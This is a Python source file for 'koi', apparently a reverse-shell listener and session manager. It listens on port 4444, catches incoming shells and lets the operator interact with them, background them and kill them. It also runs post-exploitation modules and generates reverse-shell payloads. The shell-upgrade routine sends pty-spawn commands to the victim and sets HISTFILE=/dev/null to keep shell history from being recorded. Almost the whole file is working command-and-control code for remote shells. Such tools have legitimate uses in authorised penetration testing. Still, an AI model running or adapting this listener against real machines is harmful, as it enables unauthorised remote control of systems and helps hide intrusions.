from __future__ import annotations

import os
import select
import shutil
import signal
import socket
import sys
import threading
import time
from typing import Dict, Optional

from koi.cli import print_help
from koi.modules.loader import load_modules, get_module
from koi.session import Session, RawTerminal
from koi.utils.payloads import PayloadGenerator
from koi.utils.ui import (
    colored_text, display_art, print_report_box,
    breaker, notify, Spinner,
    PUMPKIN, WHITE, SILVER, CORAL,
    _b, _c, _d, _gr, _p, _r, _y,
    gradient_text,
)

LOCALUSER = os.getenv("USER") or os.getenv("USERNAME") or "user"


class Listener:
    CTRL_Z = b"\x1a"
    CTRL_C = b"\x03"

    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        self.host = host
        self.port = port
        self._sessions: Dict[int, Session] = {}
        self._next_id = 1
        self._id_lock = threading.Lock()
        self._running = False
        self._server_sock: Optional[socket.socket] = None
        self._notify_r, self._notify_w = os.pipe()
        self._in_session = False
        self._pending_notifications: list = []
        self._notif_lock = threading.Lock()

    def _add(self, conn, addr) -> Session:
        with self._id_lock:
            sid = self._next_id
            self._next_id += 1
        sess = Session(id=sid, conn=conn, addr=addr)
        self._sessions[sid] = sess
        return sess

    def _get(self, sid: int) -> Optional[Session]:
        return self._sessions.get(sid)

    def _remove(self, sid: int) -> None:
        sess = self._sessions.pop(sid, None)
        if sess:
            sess.close()

    def _prune(self) -> None:
        for sid in [k for k, s in self._sessions.items() if not s.alive]:
            self._sessions.pop(sid)

    def _accept_loop(self):
        while self._running:
            try:
                self._server_sock.settimeout(1.0)
                conn, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            sess = self._add(conn, addr)
            os.write(self._notify_w, b"1\n")
            msg = f"{_b(_c(f'#{sess.id}'))}  {_c(addr[0])}{_gr(f':{addr[1]}')}"
            if self._in_session:
                with self._notif_lock:
                    self._pending_notifications.append(('new', msg))
            else:
                sys.stdout.write(f"\r\033[K")
                notify('new', msg)
                sys.stdout.write(self._prompt())
                sys.stdout.flush()

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(16)
        self._running = True

        threading.Thread(target=self._accept_loop, daemon=True, name="accept").start()

        display_art()
        print()
        notify('info', f"Listening on {_b(self.host)}:{_b(self.port)}")
        print()

        self._main_loop()

    def stop(self):
        self._running = False
        if self._server_sock:
            try:
                self._server_sock.close()
            except OSError:
                pass
        with Spinner("Closing sessions…"):
            for s in list(self._sessions.values()):
                if s.upgraded:
                    s.send(b"exit\n")
                    time.sleep(0.5)
                s.close()
        print()

    def _prompt(self) -> str:
        alive = sum(1 for s in self._sessions.values() if s.alive)
        noun = "session" if alive == 1 else "sessions"
        count = colored_text(str(alive), PUMPKIN if alive else SILVER)
        return (
            f"{LOCALUSER}"
            + colored_text("@", PUMPKIN)
            + colored_text("koi", WHITE)
            + _gr("(")
            + count
            + _gr(f" {noun})")
            + gradient_text(" ❯ ", PUMPKIN, CORAL)
        )

    def _main_loop(self):
        while self._running:
            try:
                r, _, _ = select.select([self._notify_r], [], [], 0)
                if r:
                    os.read(self._notify_r, 4096)
                raw = input(self._prompt()).strip()
            except EOFError:
                break
            except KeyboardInterrupt:
                print()
                continue

            if not raw:
                continue

            parts = raw.split()
            cmd = parts[0].lower()

            if cmd in ("exit", "quit"):
                self.stop()
                return

            elif cmd in ("help", "h", "?"):
                print_help()

            elif cmd in ("ls", "l", "list"):
                self._cmd_ls()

            elif cmd in ("go", "g", "interact"):
                if len(parts) < 2:
                    notify('error', f"Usage: go {_p('<id>')}")
                else:
                    try:
                        self._cmd_go(int(parts[1]))
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            elif cmd in ("upgrade", "u"):
                if len(parts) < 2:
                    notify('error', f"Usage: upgrade {_p('<id>')}")
                else:
                    try:
                        self._cmd_upgrade(int(parts[1]))
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            elif cmd == "kill":
                if len(parts) < 2:
                    notify('error', f"Usage: kill {_p('<id>')}")
                else:
                    try:
                        self._cmd_kill(int(parts[1]))
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            elif cmd in ("payload", "p"):
                self._cmd_payload(parts[1] if len(parts) > 1 else None)

            elif cmd in ("modules", "mdls", "mods"):
                self._cmd_modules()

            elif cmd in ("reload", "refresh"):
                self._cmd_reload()

            elif cmd == "run":
                self._dispatch_run(parts)

            else:
                notify('error', f"Unknown command: {_p(cmd)}  — type {_b('help')}")

    def _dispatch_run(self, parts: list) -> None:
        if len(parts) < 3:
            if len(parts) == 2:
                mod_cls = get_module(parts[1])
                if mod_cls and mod_cls.usage:
                    notify('error', f"Usage: run {_p(mod_cls.usage)}")
                elif mod_cls:
                    notify('error', f"Usage: run {_p(mod_cls.name)} {_p('<id>')}")
                else:
                    notify('error', f"Unknown module {_p(parts[1])}  — type {_b('modules')}")
            else:
                notify('error', f"Usage: run {_p('<module>')} {_p('<id>')} {_p('[args…]')}")
            return

        mod_name = parts[1]
        try:
            sid = int(parts[2])
        except ValueError:
            notify('error', "Session id must be an integer.")
            return
        self._cmd_run(mod_name, sid, parts[3:])

    def _cmd_ls(self) -> None:
        self._prune()
        if not self._sessions:
            print()
            notify('status', _gr('No active sessions.'))
            print()
            return
        data = {}
        for s in sorted(self._sessions.values(), key=lambda x: x.id):
            key = f"#{s.id}  {s.status_dot()}  {_c(s.addr[0])}{_gr(f':{s.addr[1]}')}"
            data[key] = s._uptime()
        print_report_box("Sessions", data)

    def _cmd_reload(self) -> None:
        with Spinner("Reloading modules…"):
            modules = load_modules(reload=True)
        notify('info', f"Loaded {_p(str(len(modules)))} modules.")

    def _cmd_upgrade(self, sid: int) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return
        if sess.upgraded:
            notify('warning', f"Session {_p(f'#{sid}')} is already upgraded.")
            return

        with Spinner("Upgrading shell…"):
            spawn = (
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "script -qc /bin/bash /dev/null\n"
            )
            sess.send(spawn.encode())
            self._drain(sess, 0.8)

            if not sess.alive:
                notify('error', f"Session {_p(f'#{sid}')} died during upgrade.")
                return

            sess.send(b"export TERM=xterm-256color HISTFILE=/dev/null\n")
            self._drain(sess, 0.3)
            self._sync_winsize(sess)
            self._drain(sess, 0.3)
            sess.upgraded = True

        notify('success', f"Shell {_p(f'#{sid}')} upgraded successfully.")

    def _cmd_kill(self, sid: int) -> None:
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        with Spinner(f"Terminating session #{sid}…"):
            if sess.upgraded:
                sess.send(b"exit\n")
                time.sleep(0.5)
            self._remove(sid)
        notify('success', f"Session {_p(f'#{sid}')} terminated.")

    def _cmd_go(self, sid: int) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        ip, port = sess.addr
        print()
        notify('info', f"Entering session {_b(_r(f'#{sid}'))} {_c(ip)}{_gr(f':{port}')}")
        notify('status', _gr('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
        print()

        if sess.upgraded:
            self._sync_winsize(sess)
            self._drain(sess, 0.3)
            sess.send(b"\n")
            time.sleep(0.15)
            signal.signal(signal.SIGWINCH, lambda *_: self._winch(sess))

        breaker()

        self._in_session = True
        reason = self._interact(sess)
        self._in_session = False

        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
        print()
        breaker()

        if reason == "backgrounded":
            print()
            notify('warning', f"Session {_b(_c(f'#{sid}'))} backgrounded. Back at listener shell.")
            print()
        elif reason == "disconnected":
            print()
            notify('error', f"Session {_b(_c(f'#{sid}'))} disconnected.")
            print()
            self._remove(sid)

        self._flush_pending_notifications()

    def _cmd_modules(self) -> None:
        modules = load_modules()
        if not modules:
            notify('status', _gr("No modules found in src/koi/modules/."))
            return

        has_categories = any(cls.category for cls in modules.values())

        if has_categories:
            grouped = {}
            for name, cls in modules.items():
                cat = cls.category or "Other"
                grouped.setdefault(cat, {})[_p(name)] = cls.description
            print_report_box("Modules", grouped)
        else:
            data = {_p(name): cls.description for name, cls in modules.items()}
            print_report_box("Modules", data)

    def _cmd_run(self, mod_name: str, sid: int, mod_args: list) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        mod_cls = get_module(mod_name)
        if mod_cls is None:
            available = ", ".join(load_modules().keys()) or "none"
            notify('error', f"Module {_p(mod_name)} not found.")
            notify('status', _gr(f"Available: {available}"))
            return

        notify('info', f"Running module {_p(mod_name)} on session {_p(f'#{sid}')}…")
        print()
        old_handler = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt()))
        try:
            mod = mod_cls(session=sess, args=mod_args)
            mod.run()
        except KeyboardInterrupt:
            print()
            notify('warning', "Module interrupted.")
        except Exception as exc:
            notify('error', f"Module raised an exception: {exc}")
        finally:
            signal.signal(signal.SIGINT, old_handler)
        print()

    def _cmd_payload(self, iface: Optional[str] = None) -> None:
        gen = PayloadGenerator(port=self.port)
        if iface:
            payloads = gen.for_interface(iface)
            if payloads is None:
                notify('error', f"Interface {_p(iface)} not found.")
                notify('status', _gr("Available: " + ", ".join(gen.get_interfaces().keys())))
                return
            print_report_box(f"Payloads — {iface} ({gen.get_interfaces()[iface]})", payloads)
        else:
            all_payloads = gen.for_all()
            if not all_payloads:
                notify('error', "No network interfaces found.")
                return
            interfaces = gen.get_interfaces()
            grouped = {
                f"{name} ({interfaces[name]})": payloads
                for name, payloads in all_payloads.items()
            }
            print_report_box("Payloads", grouped)

    def _flush_pending_notifications(self) -> None:
        with self._notif_lock:
            pending = self._pending_notifications[:]
            self._pending_notifications.clear()
        for msg_type, text in pending:
            notify(msg_type, text)

    def _drain(self, sess: Session, duration: float = 0.5) -> None:
        deadline = time.monotonic() + duration
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                r, _, _ = select.select([sess.conn], [], [], min(remaining, 0.05))
                if r:
                    sess.conn.recv(4096)
            except OSError:
                break

    def _sync_winsize(self, sess: Session) -> None:
        try:
            cols, rows = shutil.get_terminal_size()
        except Exception:
            return
        sess.send(f"stty rows {rows} cols {cols} 2>/dev/null\n".encode())

    def _winch(self, sess: Session) -> None:
        self._sync_winsize(sess)
        self._drain(sess, 0.15)

    def _interact(self, sess: Session) -> str:
        stop_event = threading.Event()
        result = ["backgrounded"]

        def _recv():
            while not stop_event.is_set() and sess.alive:
                try:
                    r, _, _ = select.select([sess.conn], [], [], 0.1)
                    if not r:
                        continue
                    data = sess.conn.recv(4096)
                    if not data:
                        sess.alive = False
                        result[0] = "disconnected"
                        stop_event.set()
                        return
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except OSError:
                    sess.alive = False
                    result[0] = "disconnected"
                    stop_event.set()

        recv_thread = threading.Thread(target=_recv, daemon=True)

        with RawTerminal():
            recv_thread.start()
            try:
                while not stop_event.is_set():
                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
                    if not r:
                        continue
                    key = os.read(sys.stdin.fileno(), 1024)

                    if self.CTRL_Z in key:
                        before = key[: key.index(self.CTRL_Z)]
                        if before:
                            sess.send(before)
                        result[0] = "backgrounded"
                        stop_event.set()
                        break

                    if not sess.send(key):
                        result[0] = "disconnected"
                        stop_event.set()
                        break
            except OSError:
                pass

        stop_event.set()
        recv_thread.join(timeout=1.0)
        return result[0]